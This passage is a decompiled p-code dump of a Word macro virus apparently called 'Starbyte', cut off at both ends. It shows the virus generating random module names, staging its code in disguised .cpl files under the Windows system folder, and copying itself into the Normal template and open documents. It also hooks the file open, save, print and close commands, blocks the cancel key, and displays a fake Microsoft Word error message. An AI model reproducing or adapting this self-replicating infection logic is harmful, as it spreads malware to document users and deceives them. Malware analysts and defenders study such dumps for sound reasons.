' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #263:
' 	Ld X 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #264:
' 	Ld X 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #265:
' 	Ld X 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #266:
' 	Ld X 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #267:
' 	Ld X 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #268:
' 	Ld X 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #269:
' 	Ld X 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #270:
' 	Ld X 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #271:
' 	Ld X 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #272:
' 	Ld X 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #273:
' 	Ld X 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #274:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #275:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	NextVar 
' Line #276:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #277:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld X 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID 
' Line #278:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID 
' 	PrintItemNL 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #281:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #282:
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #283:
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #284:
' 	Label rite 
' Line #285:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #286:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #287:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #288:
' 	Label nex 
' Line #289:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #290:
' 	Do 
' Line #291:
' 	OnError (Resume Next) 
' Line #292:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #293:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #294:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #295:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #296:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #297:
' 	Label nextt 
' Line #298:
' 	ExitFunc 
' Line #299:
' 	Label Recognize 
' Line #300:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #301:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #302:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #303:
' 	Do 
' Line #304:
' 	OnError (Resume Next) 
' Line #305:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #306:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #307:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #308:
' 	Ld FileID 
' 	Ld Virname 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #309:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #310:
' 	Label tryharder 
' Line #311:
' 	EndFunc 
' Line #312:
' 	FuncDefn (Function Morph_check())
' Line #313:
' 	OnError (Resume Next) 
' Line #314:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #315:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #316:
' 	Dim 
' 	VarDefn FC_Check
' Line #317:
' 	Do 
' Line #318:
' 	LitDI2 0x0001 
' 	Ld FC_Check 
' 	LineInput 
' Line #319:
' 	Ld FC_Check 
' 	LitStr 0x000F "Sub FileClose()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FC_There 
' 	BoS 0x0000 
' 	GoTo FO_Look 
' 	EndIf 
' Line #320:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #321:
' 	Label FO_Look 
' Line #322:
' 	Dim 
' 	VarDefn FO_Check
' Line #323:
' 	Do 
' Line #324:
' 	LitDI2 0x0001 
' 	Ld FO_Check 
' 	LineInput 
' Line #325:
' 	Ld FO_Check 
' 	LitStr 0x000E "Sub FileOpen()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FO_There 
' 	BoS 0x0000 
' 	GoTo FP_Look 
' 	EndIf 
' Line #326:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #327:
' 	Label FP_Look 
' Line #328:
' 	Dim 
' 	VarDefn FP_Check
' Line #329:
' 	Do 
' Line #330:
' 	LitDI2 0x0001 
' 	Ld FP_Check 
' 	LineInput 
' Line #331:
' 	Ld FP_Check 
' 	LitStr 0x000F "Sub FilePrint()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FP_There 
' 	BoS 0x0000 
' 	GoTo FN_Look 
' 	EndIf 
' Line #332:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #333:
' 	Label FN_Look 
' Line #334:
' 	Dim 
' 	VarDefn FN_Check
' Line #335:
' 	Do 
' Line #336:
' 	LitDI2 0x0001 
' 	Ld FN_Check 
' 	LineInput 
' Line #337:
' 	Ld FN_Check 
' 	LitStr 0x000D "Sub FileNew()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FN_There 
' 	BoS 0x0000 
' 	GoTo FS_Look 
' 	EndIf 
' Line #338:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #339:
' 	Label FS_Look 
' Line #340:
' 	Dim 
' 	VarDefn FS_Check
' Line #341:
' 	Do 
' Line #342:
' 	LitDI2 0x0001 
' 	Ld FS_Check 
' 	LineInput 
' Line #343:
' 	Ld FS_Check 
' 	LitStr 0x000E "Sub FileSave()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FS_There 
' 	BoS 0x0000 
' 	GoTo FSA_Look 
' 	EndIf 
' Line #344:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #345:
' 	Label FSA_Look 
' Line #346:
' 	Dim 
' 	VarDefn FSA_Check
' Line #347:
' 	Do 
' Line #348:
' 	LitDI2 0x0001 
' 	Ld FSA_Check 
' 	LineInput 
' Line #349:
' 	Ld FSA_Check 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FSA_There 
' 	BoS 0x0000 
' 	ExitFunc 
' 	EndIf 
' Line #350:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #351:
' 	EndFunc 
' Line #352:
' 	FuncDefn (Function Uprising())
' Line #353:
' 	OnError (Resume Next) 
' Line #354:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #355:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #356:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #358:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #359:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St PM 
' Line #360:
' 	Ld PM 
' 	LitDI2 0x0016 
' 	Eq 
' 	IfBlock 
' Line #361:
' 	Ld FC_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #362:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #363:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FileClose()"
' 	PrintItemNL 
' Line #364:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On error resume next"
' 	PrintItemNL 
' Line #365:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Call Starbyte"
' 	PrintItemNL 
' Line #366:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Wordbasic.FileSave"
' 	PrintItemNL 
' Line #367:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #368:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	Ld PM 
' 	LitDI2 0x0049 
' 	Eq 
' 	IfBlock 
' Line #371:
' 	Ld FO_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #372:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #373:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileOpen()"
' 	PrintItemNL 
' Line #374:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #375:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "Dialogs(wdDialogFileOpen)"
' 	PrintItemNL 
' Line #376:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Call Starbyte"
' 	PrintItemNL 
' Line #377:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #378:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #379:
' 	EndIfBlock 
' Line #380:
' 	Ld PM 
' 	LitDI2 0x0045 
' 	Eq 
' 	IfBlock 
' Line #381:
' 	Ld FP_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #382:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #383:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FilePrint()"
' 	PrintItemNL 
' Line #384:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #385:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Dialogs(wdDialogFilePrint)"
' 	PrintItemNL 
' Line #386:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Call Starbyte"
' 	PrintItemNL 
' Line #387:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End sub"
' 	PrintItemNL 
' Line #388:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #389:
' 	EndIfBlock 
' Line #390:
' 	Ld PM 
' 	LitDI2 0x0016 
' 	Eq 
' 	IfBlock 
' Line #391:
' 	Ld FN_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #392:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #393:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Sub FileNew()"
' 	PrintItemNL 
' Line #394:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #395:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Dialogs(wdDialogFileNew)"
' 	PrintItemNL 
' Line #396:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Call Starbyte"
' 	PrintItemNL 
' Line #397:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #398:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #399:
' 	EndIfBlock 
' Line #400:
' 	Ld PM 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #401:
' 	Ld FS_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #402:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #403:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #404:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #405:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "call Starbyte"
' 	PrintItemNL 
' Line #406:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #407:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #408:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #409:
' 	EndIfBlock 
' Line #410:
' 	Ld PM 
' 	LitDI2 0x0012 
' 	Eq 
' 	IfBlock 
' Line #411:
' 	Ld FSA_There 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #412:
' 	Ld FileID 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #413:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	PrintItemNL 
' Line #414:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "on error resume next"
' 	PrintItemNL 
' Line #415:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Dialogs(wdDialogFileSaveAs)"
' 	PrintItemNL 
' Line #416:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Call Starbyte"
' 	PrintItemNL 
' Line #417:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "wordbasic.filesave"
' 	PrintItemNL 
' Line #418:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "end sub"
' 	PrintItemNL 
' Line #419:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #420:
' 	EndIfBlock 
' Line #421:
' 	EndFunc 
' Line #422:
' 	FuncDefn (Function NfctNormal())
' Line #423:
' 	OnError (Resume Next) 
' Line #424:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #425:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #426:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #427:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #428:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #429:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nexus 
' 	EndIf 
' Line #430:
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #431:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #432:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld l 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #433:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #434:
' 	EndIfBlock 
' Line #435:
' 	Label nexus 
' Line #436:
' 	StartForVariable 
' 	Ld l 
' 	EndForVariable 
' 	NextVar 
' Line #437:
' 	StartWithExpr 
' 	Ld FileID 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #438:
' 	EndWith 
' Line #439:
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte"
' 	LitStr 0x0009 "Lucky2000"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #440:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #441:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #442:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #443:
' 	LitStr 0x0091 "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists please contact Microsoft Technical Support."
' 	MemStWith Then 
' Line #444:
' 	LitStr 0x000E "Microsoft Word"
' 	MemStWith Heading 
' Line #445:
' 	Ld msoAnimationGetTechy 
' 	MemStWith Animation 
' Line #446:
' 	ArgsMemCallWith Show 0x0000 
' Line #447:
' 	EndWith 
' Line #448:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte"
' 	LitStr 0x0009 "Lucky2000"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #449:
' 	EndFunc 
' Line #450:
' 	FuncDefn (Function NfctFile())
' Line #451:
' 	OnError (Resume Next) 
' Line #452:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #453:
' 	LitStr 0x0000 ""
' 	St VrusName 
' Line #454:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #455:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #456:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #457:
' 	StartWithExpr 
' 	Ld FileID 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #458:
' 	EndWith 
' Line #459:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #460:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St q 
' Line #461:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q 
' 	For 
' Line #462:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St X 
' Line #463:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #464:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #465:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #466:
' 	Ld X 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #467:
' 	Ld X 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #468:
' 	Ld X 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #469:
' 	Ld X 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #470:
' 	Ld X 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #471:
' 	Ld X 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #472:
' 	Ld X 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #473:
' 	Ld X 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #474:
' 	Ld X 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #475:
' 	Ld X 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #476:
' 	Ld X 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #477:
' 	Ld X 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #478:
' 	Ld X 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #479:
' 	Ld X 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #480:
' 	Ld X 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #481:
' 	Ld X 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #482:
' 	Ld X 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #483:
' 	Ld X 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #484:
' 	Ld X 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #485:
' 	Ld X 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #486:
' 	Ld X 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #487:
' 	Ld X 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #488:
' 	Ld X 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #489:
' 	Ld VrusName 
' 	Ld a$ 
' 	Add 
' 	St VrusName 
' Line #490:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	NextVar 
' Line #491:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #492:
' 	Do 
' Line #493:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #494:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Virname 
' 	ParamNamed New 
' 	Ld VrusName 
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #495:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #496:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #497:
' 	StartForVariable 
